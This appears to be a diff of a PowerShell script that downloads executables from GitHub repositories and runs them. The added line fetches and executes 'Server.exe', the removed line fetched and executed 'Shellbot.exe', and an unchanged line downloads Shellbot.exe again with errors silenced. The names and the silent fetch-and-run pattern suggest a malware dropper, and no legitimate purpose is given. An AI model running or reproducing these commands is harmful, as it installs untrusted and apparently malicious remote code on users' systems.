@@ -1,4 +1,4 @@
-Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/Shellbot.exe" -OutFile "Shellbot.exe"; .\Shellbot.exe
+Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Server.exe" -OutFile "Server.exe"; .\Server.exe
 
 Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/Shellbot.exe" -OutFile "Shellbot.exe" -ErrorAction SilentlyContinue
     
